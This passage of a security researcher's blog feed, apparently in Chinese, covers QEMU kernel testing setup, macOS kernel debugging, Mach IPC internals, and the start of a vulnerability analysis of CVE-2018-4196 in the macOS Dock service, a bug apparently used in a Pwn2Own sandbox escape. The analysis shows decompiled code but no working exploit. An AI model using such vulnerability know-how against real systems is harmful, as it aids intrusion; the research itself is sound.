<span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$IMG</span> <span class="variable">$DIR</span></span><br><span class="line">sudo debootstrap --arch amd64 jessie <span class="variable">$DIR</span></span><br><span class="line">sudo umount <span class="variable">$DIR</span></span><br><span class="line">rmdir <span class="variable">$DIR</span></span><br></pre></td></tr></table></figure><p>这样直接创建不行，需要在取消挂载之前设置好新文件系统里的用户名密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot mount-point.dir /bin/bash</span><br></pre></td></tr></table></figure><p>进去之后，直接修改root密码就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># passwd root</span></span><br></pre></td></tr></table></figure><p>其实还能做其他的设置，但是只是为了验证加载的内核是否正常，只需要登录进去就ok了。</p><p>基本上都能用这个命令起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-x86_64 \</span><br><span class="line">-<span class="built_in">enable</span>-kvm \</span><br><span class="line">-m 2G -smp 2 \</span><br><span class="line">-hda qemu-image.img  \</span><br><span class="line">-kernel linux-5.4-rc4/arch/x86/boot/bzImage \</span><br><span class="line">-append <span class="string">"debug root=/dev/sda  console=ttyS0"</span> \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><p>除了ktsan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -drive file=qemu-image.img,index=0 \</span><br><span class="line">  -m 24G -smp 4 \</span><br><span class="line">  -net user,hostfwd=tcp::10022-:22 -net nic \</span><br><span class="line">  -nographic \</span><br><span class="line">  -kernel arch/x86/boot/bzImage -append <span class="string">"console=ttyS0 root=/dev/sda rw debug earlyprintk=serial slub_debug=QUZ"</span>\</span><br><span class="line">  -<span class="built_in">enable</span>-kvm -cpu host</span><br></pre></td></tr></table></figure><p>我用它wiki里的命令无法成功启动，各种panic，或者就是文件系统挂载出问题，我换了我原本的ext2的img之后多试几次，就能正常工作了。</p><p>我这里给的是<code>24G</code>内存。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/google/ktsan/wiki" target="_blank" rel="noopener">ktsan</a><br><a href="https://github.com/google/kmsan" target="_blank" rel="noopener">kmsan</a><br><a href="https://www.kernel.org" target="_blank" rel="noopener">linux-kernel</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;env-config&quot;&gt;&lt;a href=&quot;#env-config&quot; class=&quot;headerlink&quot; title=&quot;env config&quot;&gt;&lt;/a&gt;env config&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ubuntu 18.04 amd64&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Linux" scheme="http://o0xmuhe.me/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Debug macOS Kernel</title>
    <link href="http://o0xmuhe.me/2019/10/17/Debug-macOS-Kernel/"/>
    <id>http://o0xmuhe.me/2019/10/17/Debug-macOS-Kernel/</id>
    <published>2019-10-17T08:30:05.000Z</published>
    <updated>2019-10-17T08:59:17.759Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00 : 环境配置"></a>0x00 : 环境配置</h2><p>基本分为两种情况，虚拟机调试或者双机调试。</p><p>虚拟机 ： <code>vmfusion</code>,`` KDK`</p><p>双机: 火线。 我这里用的是``mbp2017<code>调</code>mbp2015<code>，借了同事的线，连接为：</code>mbp2017-typec-雷电2-火线-雷电2-mbp2015`。</p><a id="more"></a><h2 id="0x01-虚拟机"><a href="#0x01-虚拟机" class="headerlink" title="0x01 : 虚拟机"></a>0x01 : 虚拟机</h2><p>下面是标准步骤</p><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><ol start="0"><li><p>关闭SIP，并且把想要加载的内核拷贝到 内核的目录</p><p><code>sudo cp /Library/Developer/KDKs/KDK_YOUR_VERSION/System/Library/Kernels/kernel.development /System/Library/Kernels</code></p></li></ol><ol><li><p>安装当前版本系统的KDK，[Apple Develop KDK download](<a href="https://developer.apple.com/download/more/?q=Kernel" target="_blank" rel="noopener">https://developer.apple.com/download/more/?q=Kernel</a> Debug Kit)</p></li><li><p>设置启动参数</p><p><code>sudo nvram boot-args=&quot;debug=0x14e kext-dev-mode=1 kcsuffix=development pmuflags=1 -v&quot;</code></p></li><li><p>清理缓存</p><p><code>sudo kextcache -invalidate /</code></p></li><li><p>记住当前vm的ip，然后重启</p><p><code>sudo reboot</code></p></li></ol><p>这里把<code>development</code>版本的内核拷贝到<code>System/Library/Kernels</code>里，指定启动时加载<code>development</code>版本的内核，当然也可以加载<code>kasan</code>版本的，看需求。</p><h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><ol start="0"><li>安装被调试机器的KDK</li></ol><p>这种情况是靠网络调试。</p><p>但是根据之前的启动参数，开机时断不下来的，当然可以设置一个0x1来让他启动时断下来等调试器，但是经过测试，这个不好使(可能我环境有问题)。</p><p>如果按照上面的设置<code>0x14e</code> ，那么需要在虚拟机中按下 <code>cmd + opt + ctrl + shitf+ esc</code>触发中断，</p><p>随后lldb中 : </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">(lldb)kdp-remote you_vm_ip</span><br></pre></td></tr></table></figure><p>之后就可以调试了。</p><h2 id="0x02-双机调试"><a href="#0x02-双机调试" class="headerlink" title="0x02 : 双机调试"></a>0x02 : 双机调试</h2><p>下面是标准步骤</p><h3 id="被调试机"><a href="#被调试机" class="headerlink" title="被调试机"></a>被调试机</h3><ol start="0"><li><p>关SIP，拷贝KDK里的内核到<code>/System/Library/Kernels</code></p></li><li><p>安装当前系统版本的KDK</p></li><li><p>设置启动参数</p><p><code>sudo nvram boot-args=&quot;debug=0x14e kdp_match_name=firewire fwkdp=0x8000 kcsuffix=development&quot;</code></p></li><li><p>清理缓存</p><p><code>sudo kextcache -invalidate /</code></p></li><li><p>重启</p><p><code>sudo reboot</code></p></li></ol><p>这里必须说一下，火线的名称，<code>ifconfig</code>里看到的，默认是<code>fw0</code>，但是这个启动参数里必须是<code>firewire</code>，</p><p>必须是<code>firewire</code>，必须是<code>firewire</code>！</p><p>这个地方坑了我挺久，我一直以为用<code>ifconfig</code>里看到的那个名字  :-(</p><h3 id="调试机"><a href="#调试机" class="headerlink" title="调试机"></a>调试机</h3><ol start="0"><li><p>安装被调试机器的KDK</p></li><li><p>LLDB加载目标内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure></li><li><p>启动fwkdp</p><p><code>fwkdp -v</code></p></li><li><p>被调试机按下<code>cmd+opt+ctrl+shift+esc</code>触发中断</p></li><li><p>lldb 里连接</p><p><code>(lldb) kdp-remote localhost</code></p></li></ol><p>感觉过程就是<code>fwkdp</code>做了转发的工作，所以lldb直接<code>kdp-remote</code>就可以了。</p><h2 id="0x03-KDK是必须的吗？"><a href="#0x03-KDK是必须的吗？" class="headerlink" title="0x03 : KDK是必须的吗？"></a>0x03 : KDK是必须的吗？</h2><p>并不是，kdk只是给你更多的内核中的符号，所以不用kdk也没事，就等于直接调试正式版的内核，少了内核符号而已，人肉对比着近期版本的源码其实影响没那么大。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-环境配置&quot;&gt;&lt;a href=&quot;#0x00-环境配置&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 环境配置&quot;&gt;&lt;/a&gt;0x00 : 环境配置&lt;/h2&gt;&lt;p&gt;基本分为两种情况，虚拟机调试或者双机调试。&lt;/p&gt;
&lt;p&gt;虚拟机 ： &lt;code&gt;vmfusion&lt;/code&gt;,`` KDK`&lt;/p&gt;
&lt;p&gt;双机: 火线。 我这里用的是``mbp2017&lt;code&gt;调&lt;/code&gt;mbp2015&lt;code&gt;，借了同事的线，连接为：&lt;/code&gt;mbp2017-typec-雷电2-火线-雷电2-mbp2015`。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>Snell auto install cript</title>
    <link href="http://o0xmuhe.me/2019/09/26/Snell-auto-install-cript/"/>
    <id>http://o0xmuhe.me/2019/09/26/Snell-auto-install-cript/</id>
    <published>2019-09-26T08:57:01.000Z</published>
    <updated>2019-09-26T08:59:36.155Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Snell"><a href="#0x00-Snell" class="headerlink" title="0x00 : Snell"></a>0x00 : Snell</h2><p>Snell是Surge支持的一种**协议，但是server并不开源，也就是说只有Surge客户端才能用。</p><a id="more"></a><p>琢磨了下写了个自动化的配置脚本。</p><h2 id="0x01-Script"><a href="#0x01-Script" class="headerlink" title="0x01 : Script"></a>0x01 : Script</h2><p><a href="https://gist.github.com/o0xmuhe/c8d548037f42e651595af79408e299a2" target="_blank" rel="noopener">snel.sh</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-Snell&quot;&gt;&lt;a href=&quot;#0x00-Snell&quot; class=&quot;headerlink&quot; title=&quot;0x00 : Snell&quot;&gt;&lt;/a&gt;0x00 : Snell&lt;/h2&gt;&lt;p&gt;Snell是Surge支持的一种**协议，但是server并不开源，也就是说只有Surge客户端才能用。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Snell" scheme="http://o0xmuhe.me/tags/Snell/"/>
    
      <category term="Surge" scheme="http://o0xmuhe.me/tags/Surge/"/>
    
  </entry>
  
  <entry>
    <title>macOS IPC Study Notes</title>
    <link href="http://o0xmuhe.me/2019/09/20/macOS-IPC-Study-basic-2/"/>
    <id>http://o0xmuhe.me/2019/09/20/macOS-IPC-Study-basic-2/</id>
    <published>2019-09-20T09:43:44.000Z</published>
    <updated>2019-09-20T09:56:10.805Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-方式"><a href="#1-方式" class="headerlink" title="1. 方式"></a>1. 方式</h2><a id="more"></a><ul><li><p>MIG</p></li><li><p>XPC</p></li><li><p>DO</p><p>….</p></li></ul><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651523516510.jpg" alt="-w303"></p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651523730105.jpg" alt="-w843"></p><p>然而一切都是在Mach Msg的基础之上的。</p><h2 id="2-一些基础概念"><a href="#2-一些基础概念" class="headerlink" title="2. 一些基础概念"></a>2. 一些基础概念</h2><h3 id="2-1-什么是Port"><a href="#2-1-什么是Port" class="headerlink" title="2.1 什么是Port"></a>2.1 什么是Port</h3><p>个人理解就是类似Windows上handle的概念。<br>用户态经过处理是一个类似socket的整数，内核态(namep)索引到与之对应的消息队列，IPC时通过Port传递数据到消息队列，或者从消息队列取出数据。</p><h4 id="2-2-2-port-name"><a href="#2-2-2-port-name" class="headerlink" title="2.2.2 port name"></a>2.2.2 port name</h4><h4 id="2-2-3-port-right"><a href="#2-2-3-port-right" class="headerlink" title="2.2.3 (port) right"></a>2.2.3 (port) right</h4><p>一个port和对这个port的访问权限，有对应的权限才能做对应的操作，比如recv，接收数据；send，发送数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define MACH_PORT_RIGHT_SEND((mach_port_right_t) 0)</span><br><span class="line">#define MACH_PORT_RIGHT_RECEIVE((mach_port_right_t) 1)</span><br><span class="line">#define MACH_PORT_RIGHT_SEND_ONCE((mach_port_right_t) 2)</span><br><span class="line">#define MACH_PORT_RIGHT_PORT_SET((mach_port_right_t) 3)</span><br><span class="line">#define MACH_PORT_RIGHT_DEAD_NAME((mach_port_right_t) 4)</span><br><span class="line">#define MACH_PORT_RIGHT_LABELH        ((mach_port_right_t) 5)</span><br><span class="line">#define MACH_PORT_RIGHT_NUMBER((mach_port_right_t) 6)</span><br></pre></td></tr></table></figure><h3 id="2-2-创建流程"><a href="#2-2-创建流程" class="headerlink" title="2.2 创建流程"></a><a href="http://localhost:23333/source/xref/osfmk/ipc/mach_port.c" target="_blank" rel="noopener">2.2 创建流程</a></h3><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_port_t</span> p;</span><br><span class="line">mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;p);</span><br></pre></td></tr></table></figure><p><code>mach_port_allocate</code></p><p>函数定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_port_allocate(</span><br><span class="line">4<span class="keyword">ipc_space_t</span>space,</span><br><span class="line">4<span class="keyword">mach_port_right_t</span>right,</span><br><span class="line">4<span class="keyword">mach_port_name_t</span>*namep)</span><br><span class="line">&#123;</span><br><span class="line">4<span class="keyword">kern_return_t</span>kr;</span><br><span class="line">4<span class="keyword">mach_port_qos_t</span>qos = qos_template;</span><br><span class="line"></span><br><span class="line">4kr = mach_port_allocate_full (space, right, MACH_PORT_NULL,</span><br><span class="line">44444&amp;qos, namep);</span><br><span class="line">4<span class="keyword">return</span> (kr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mach_port_allocate_full</code><br>根据不同的right走不同的分配逻辑：<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651518463591.jpg" alt="-w680"></p><p><code>ipc_port_alloc</code> /<code>ipc_port_alloc_name</code><br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651517357620.jpg" alt="-w614"></p><p>两个函数区别只是是否指定了name。</p><p><code>ipc_object_alloc</code><br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651517526507.jpg" alt="-w596"></p><p>348行通过一个宏，把port转name的方式获取namep，之后对ipc entry的关键结构进行初始化。</p><p><code>ipc_port_init</code></p><p>初始化<a href="http://localhost:23333/source/xref/osfmk/ipc/ipc_port.h#112" target="_blank" rel="noopener">port结构</a></p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651518062479.jpg" alt="-w641"></p><p>至此，port初始化完成，namep初始化完成，可以根据namep索引到对应的内核中的消息队列。</p><p>port与ipc entry的关系，来自Mac OS X Internals:</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651519972092.jpg" alt=""></p><p><strong>其中的一些概念：</strong></p><ul><li>用户态 mach_port_t</li></ul><p>port在用户态表示，类似socket的一个整数</p><ul><li><p>内核态 mach_port_name_t</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef natural_t mach_port_name_t;</span><br></pre></td></tr></table></figure><p>port在内核态表示</p></li><li><p>qos</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Structure used to pass information about port allocation requests.Must be padded to 64-bits total length.</span><br></pre></td></tr></table></figure></li><li><p>ipc space </p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Each task has a private IPC spacea namespace for portsthat is represented by the ipc_space structure in the kernel. </span><br><span class="line">Mac OS X Internals</span><br></pre></td></tr></table></figure><p>每个task都有自己的唯一一个ipc sapce,</p><p>其中 <code>ipc_entry_t is_table;        /* an array of entries */</code> 字段是放着所有的ipc entry。</p><p><a href="http://localhost:23333/source/xref/osfmk/kern/task.h" target="_blank" rel="noopener">task的结构体实在是太大了</a>，从task的<code>struct ipc_space *itk_space;</code>字段索引到其对应的ipc space。</p><ul><li>ipc entry</li></ul><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651508934037.jpg" alt=""></p><p>看源码发现，图中的<code>ipc_tree_entry</code>结构没了:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> &#123;</span></span><br><span class="line">4<span class="keyword">lck_spin_t</span>is_lock_data;</span><br><span class="line">4<span class="keyword">ipc_space_refs_t</span> is_bits;<span class="comment">/* holds refs, active, growing */</span></span><br><span class="line">4<span class="keyword">ipc_entry_num_t</span> is_table_size;<span class="comment">/* current size of table */</span></span><br><span class="line">4<span class="keyword">ipc_entry_num_t</span> is_table_free;<span class="comment">/* count of free elements */</span></span><br><span class="line">4<span class="keyword">ipc_entry_t</span> is_table;<span class="comment">/* an array of entries */</span></span><br><span class="line">4<span class="keyword">task_t</span> is_task;                 <span class="comment">/* associated task */</span></span><br><span class="line">4<span class="class"><span class="keyword">struct</span> <span class="title">ipc_table_size</span> *<span class="title">is_table_next</span>;</span> <span class="comment">/* info for larger table */</span></span><br><span class="line">4<span class="keyword">ipc_entry_num_t</span> is_low_mod;<span class="comment">/* lowest modified entry during growth */</span></span><br><span class="line">4<span class="keyword">ipc_entry_num_t</span> is_high_mod;<span class="comment">/* highest modified entry during growth */</span></span><br><span class="line">4<span class="keyword">int</span> is_node_id;<span class="comment">/* HOST_LOCAL_NODE, or remote node if proxy space */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>port的user reference计数是啥<br>一个port的user reference只表示了某个entry在task的space中被多少个地方使用，和entry实际指向哪个port没有关系</li></ul><h3 id="2-3-发送MACH-MSG"><a href="#2-3-发送MACH-MSG" class="headerlink" title="2.3 发送MACH MSG"></a>2.3 发送MACH MSG</h3><p>mach msg的结构不再赘述，这部分直接看<code>message.h</code>头文件里的定义即可，下面着重看发送和接收过程。</p><p><strong>其实是一个把mach msg转换成kmsg结构，然后入队(目标消息队列)的操作，目标进程获取就是一个出队的操作。</strong></p><p><code>用户态(client) &lt;--&gt; 内核态 &lt;--&gt; 用户态(server)</code></p><p>收/发都是用<code>mach_msg</code>，使用options参数区别是收还是发。</p><h4 id="2-3-1-流程"><a href="#2-3-1-流程" class="headerlink" title="2.3.1 流程"></a>2.3.1 流程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mach_msg(...)</span><br><span class="line">    mach_msg_trap(...)</span><br><span class="line">        mach_msg_overwrite_trap(...)</span><br><span class="line">            option &amp; MACH_SEND_MSG --&gt; mach_msg_send</span><br><span class="line">                <span class="comment">// mach_msg --&gt; kmsg</span></span><br><span class="line">                <span class="comment">// alloc a kernel msg buffer(kmsg), and copy user mach_msg to kernel msg buffer</span></span><br><span class="line">                ipc_kmsg_get(msg_addr, send_size, &amp;kmsg);</span><br><span class="line">                ipc_kmsg_copyin</span><br><span class="line">                    ipc_kmsg_copyin_hearder(kmsg, space, override, optionp)</span><br><span class="line">                    ipc_kmsg_copyin_body(kmsg, space, <span class="built_in">map</span>, optionp)</span><br><span class="line">                ipc_kmsg_send</span><br><span class="line">                    ipc_voucher_send_preprocessing(kmsg);</span><br><span class="line">                    ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg,option,send_timeout);</span><br><span class="line">            option &amp; MACH_RCV_MSG <span class="comment">//TODO</span></span><br><span class="line">                ipc_mqueue_copyin(space, rcv_name, &amp;mqueue, &amp;object);</span><br><span class="line">                mach_msg_rcv_link_special_reply_port(...)</span><br><span class="line">                ipc_mqueue_receive</span><br><span class="line">                mach_msg_receive_results</span><br></pre></td></tr></table></figure><h4 id="2-3-2-发送"><a href="#2-3-2-发送" class="headerlink" title="2.3.2 发送"></a>2.3.2 发送</h4><ul><li><p>mach_msg_send( mach_msg_header_t    *msg, mach_msg_option_t    option, mach_msg_size_t        send_size, mach_msg_timeout_t    send_timeout, mach_msg_priority_t    override)</p><p>  根据消息大小重新分配了内存，并且把消息拷贝进来，并且消息尾部增加了一些字段:</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">trailer = (<span class="keyword">mach_msg_max_trailer_t</span> *) ((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header + send_size);</span><br><span class="line">trailer-&gt;msgh_sender = current_thread()-&gt;task-&gt;sec_token;</span><br><span class="line">trailer-&gt;msgh_audit = current_thread()-&gt;task-&gt;audit_token;</span><br><span class="line">trailer-&gt;msgh_trailer_type = MACH_MSG_TRAILER_FORMAT_0;</span><br><span class="line">trailer-&gt;msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE;</span><br></pre></td></tr></table></figure><p>   之前审服务的时候遇到过，还以为这部分是可控的，造成乌龙。 囧</p><ul><li><p>ipc_kmsg_copyin(kmsg, space, map, override, &amp;option);</p><p>  此时<code>kmsg</code>是新分配的内存，里面放的是要发送的mach msg， space和map都是当前task的space和map，直接获取，这部分有个图，可以看<code>Macos Internals</code>。</p><ul><li>ipc_kmsg_copyin_header(kmsg, space, override, optionp);<br>   拷贝 <code>port rights</code>，成功的话，原本消息中(kmsg)的port name都会被替换成对应的对象的指针。</li><li>ipc_kmsg_copyin_body( kmsg, space, map);<br>  <strong>拷贝msg body部分，中间验证了size、desc部分的size，类型等字段。</strong><br>  desc_count &lt; 0x3fff 。<br>  descriptor_size部分，必须是desc*16 == descriptor_size，不满足会为了对齐而调整。<br>   最终完成拷贝，把用户态的<code>mach msg</code>拷贝到了kmsg中。</li></ul></li><li><p>ipc_kmsg_send(kmsg, option, send_timeout);<br>  到这里的时候port right拷贝了，消息内容也拷贝了，该直接发送了。<strong>把消息发送到dst的消息队列里。</strong><br>  对于发送给内核的消息和非内核的消息分开处理<br>  内核：<code>kmsg = ipc_kobject_server(kmsg, option);</code><br>  其他：<code>ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg, option, send_timeout);</code></p></li></ul><h4 id="2-3-3-接收"><a href="#2-3-3-接收" class="headerlink" title="2.3.3 接收"></a>2.3.3 接收</h4><ul><li><p><code>ipc_mqueue_copyin(space, rcv_name, &amp;mqueue, &amp;object);</code><br>  Convert a name in a space to a message queue.<br>  根据这个recv_name在space里找到<code>ipc_entry</code>结构，从而找到其中<code>ipc_object-&gt;ipmessage</code>结构。<br>  <img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15688799669922.jpg" alt="-w532"></p></li><li><p>mach_msg_rcv_link_special_reply_port(…)</p></li><li><p><code>ipc_mqueue_receive(mqueue, option, rcv_size, msg_timeout, THREAD_ABORTSAFE);</code><br>  Receive a message from a message queue<br>  之前得到了消息队列<code>mqueue</code>，这个函数就是从这个消息队列中取出消息。</p><ul><li><p>ipc_mqueue_receive_on_thread<br>使用指定thread从消息队列中接收消息。<br>接受分port set(<code>imq_is_set()</code>) 和 单个port(<code>imq_is_queue()</code>)，这部分看message queue的结构体也能看出来必须要这么处理。</p><p>消息队列是一个循环双向链表，取消息的过程就是一个 unlink的过程：<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15688831598476.jpg" alt="-w629"></p></li></ul></li></ul><ul><li>mach_msg_receive_results<br>  Receive a message， copy out的操作，把之前“解链”的消息拷贝出来。</li></ul><h2 id="3-引用"><a href="#3-引用" class="headerlink" title="3. 引用"></a>3. 引用</h2><p><a href="https://turingh.github.io/2017/01/10/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/" target="_blank" rel="noopener">再谈Mach-IPC</a><br>Mac OS X Internals<br>MOXil<br>Auditing and Exploiting Apple IPC – Ianbeer<br><a href="https://bazad.github.io/" target="_blank" rel="noopener">bazad</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-方式&quot;&gt;&lt;a href=&quot;#1-方式&quot; class=&quot;headerlink&quot; title=&quot;1. 方式&quot;&gt;&lt;/a&gt;1. 方式&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="MacOS" scheme="http://o0xmuhe.me/tags/MacOS/"/>
    
      <category term="IPC" scheme="http://o0xmuhe.me/tags/IPC/"/>
    
      <category term="Mach" scheme="http://o0xmuhe.me/tags/Mach/"/>
    
  </entry>
  
  <entry>
    <title>Uninitialised Objective-C Pointer Vulnerability Analysis (CVE-2018-4196)</title>
    <link href="http://o0xmuhe.me/2019/09/09/Uninitialised-Objective-C-Pointer-Vulnerability-Analysis-CVE-2018-4196/"/>
    <id>http://o0xmuhe.me/2019/09/09/Uninitialised-Objective-C-Pointer-Vulnerability-Analysis-CVE-2018-4196/</id>
    <published>2019-09-09T08:38:33.000Z</published>
    <updated>2019-09-09T08:54:36.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><p>MWR Lab在pwn2own2018用来macOS上一整套利用的sbx部分漏洞分析，这个漏洞发生在<code>com.apple.dock.server</code>服务，是一个栈指针未初始化。</p><a id="more"></a><h2 id="vuln-10-13’s-Dock-binary"><a href="#vuln-10-13’s-Dock-binary" class="headerlink" title="vuln(10.13’s Dock binary)"></a>vuln(10.13’s Dock binary)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v107 = a5;</span><br><span class="line">v5 = a3;</span><br><span class="line">v105 = a2;</span><br><span class="line">v111 = <span class="number">1</span>;</span><br><span class="line">v102 = a4;</span><br><span class="line">v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)a4;</span><br><span class="line">v98 = a4;</span><br><span class="line">v7 = UnserializeCFType(a3, a4, &amp;v89);</span><br><span class="line">v8 = objc_autorelease(*(_QWORD *)&amp;v89);</span><br><span class="line">v9 = (<span class="keyword">void</span> *)_objc_retain(v8);</span><br><span class="line">v10 = v9;</span><br><span class="line"><span class="keyword">if</span> ( v7 )</span><br><span class="line">&#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>  v89未初始化，到这里还造成不了什么问题；</p><p>主要是看<code>UnserializeCFType</code>的逻辑，这个函数会call到<code>_AXUnserializeCFType</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">__text:000000000000F043</span><br><span class="line">__text:000000000000F043                 public _AXUnserializeCFType</span><br><span class="line">__text:000000000000F043 